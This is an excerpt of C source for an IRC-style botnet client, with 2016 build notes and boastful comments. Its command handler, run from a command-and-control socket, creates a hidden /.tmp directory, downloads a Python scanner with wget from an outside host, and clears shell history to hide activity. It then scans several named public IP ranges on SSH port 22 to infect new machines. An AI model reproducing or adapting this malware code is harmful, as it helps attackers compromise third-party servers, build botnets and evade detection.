/*
volatile is your babby daddy no questions asked
b1nary good job on putting tags on HTTP flood dumb dumb
fixed version for kofuku lolol
...
*/
/*
*** THIS BUILD WAS RELEASED ON 11-8-16
...
*/
/*
Things Coming to Build 4.
Build 4 Release Date: 11-18-16
...
void processCmd(int argc, unsigned char *argv[]) {
		...
		if(!strcmp(argv[0], "PYTHON")) //Infect a Scanner server to the net, before executing this.
		{
			...
			{
				system("sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 0.0.0.0/scan.py");
				ClearHistory();
				sockprintf(mainCommSock, "Installing Python Scanner");
			}
			if(!strcmp(argv[1], "UPDATE"))
			{
				system("cd /.tmp;rm -rf *py;wget 0.0.0.0/scan.py");
				ClearHistory();
			...
			if(!strcmp(argv[1], "1"))
			{
				system("cd /.tmp;python scan.py 376 B 119.93 lol");
				ClearHistory();
				sockprintf(mainCommSock, "Scanning 119.93.x.x on Port 22");
			}
			if(!strcmp(argv[1], "2"))
			{
				system("cd /.tmp;python scan.py 376 B 91.98 2");
				ClearHistory();
				sockprintf(mainCommSock, "Scaning 91.98.x.x on Port 22");
			}
			if(!strcmp(argv[1], "3"))
			{
				system("cd /.tmp;python scan.py 376 B 118.173 2");
				ClearHistory();
				sockprintf(mainCommSock, "Scanning 118.173.x.x on Port 22");
			}
			if(!strcmp(argv[1], "4"))
			{
				system("cd /.tmp;python scan.py 376 B 91.99 2");
				ClearHistory();
				sockprintf(mainCommSock, "Scanning 91.99.x.x on Port 22");
			}
			if(!strcmp(argv[1], "5"))
			{
				system("cd /.tmp;python scan.py 376 B 92.99 2");
				ClearHistory();
				sockprintf(mainCommSock, "Scanning 92.99.x.x on Port 22");
			}
			if(!strcmp(argv[1], "LOAD"))
			{
				system("cd /.tmp;killall -9 python;python scan.py 376 LOAD 88 2");
				ClearHistory();
				sockprintf(mainCommSock, "Loading Random Ranges on Port 22");
			}
		}
